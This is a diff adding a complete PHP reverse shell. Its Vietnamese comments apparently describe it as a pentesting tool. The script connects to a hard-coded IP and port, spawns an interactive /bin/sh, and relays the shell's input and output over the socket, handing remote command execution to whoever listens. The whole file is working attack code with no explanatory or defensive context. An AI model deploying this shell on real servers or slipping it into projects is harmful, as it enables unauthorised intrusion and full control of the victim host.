@@ -1,0 +1,40 @@
+<?php
+set_time_limit(0); // Không giới hạn thời gian thực thi
+$ip = '192.168.100.244'; // Địa chỉ IP của máy pentester
+$port = 1234;  // Cổng kết nối
+$shell = '/bin/sh -i'; // Shell được sử dụng
+
+// Mở kết nối reverse shell
+$sock = fsockopen($ip, $port, $errno, $errstr, 30); // Tạo kết nối tới máy tấn công
+if (!$sock) exit(1); // Thoát nếu không kết nối được
+
+$process = proc_open($shell, [
+    0 => ["pipe", "r"], // stdin
+    1 => ["pipe", "w"], // stdout
+    2 => ["pipe", "w"]  // stderr
+], $pipes);
+
+if (!is_resource($process)) exit(1); // Thoát nếu không mở được shell
+
+// Đặt các stream ở chế độ không chặn
+foreach ($pipes as $pipe) stream_set_blocking($pipe, 0);
+stream_set_blocking($sock, 0);
+
+while (1) {
+    if (feof($sock) || feof($pipes[1])) break; // Dừng khi kết nối hoặc shell bị đóng
+
+    // Chuyển dữ liệu từ socket đến shell stdin
+    if ($input = fread($sock, 1400)) fwrite($pipes[0], $input);
+
+    // Chuyển dữ liệu từ shell stdout đến socket
+    if ($output = fread($pipes[1], 1400)) fwrite($sock, $output);
+
+    // Chuyển dữ liệu từ shell stderr đến socket (tùy chọn)
+    if ($error = fread($pipes[2], 1400)) fwrite($sock, $error);
+}
+
+// Đóng các kết nối
+fclose($sock);
+foreach ($pipes as $pipe) fclose($pipe);
+proc_close($process);
+?>
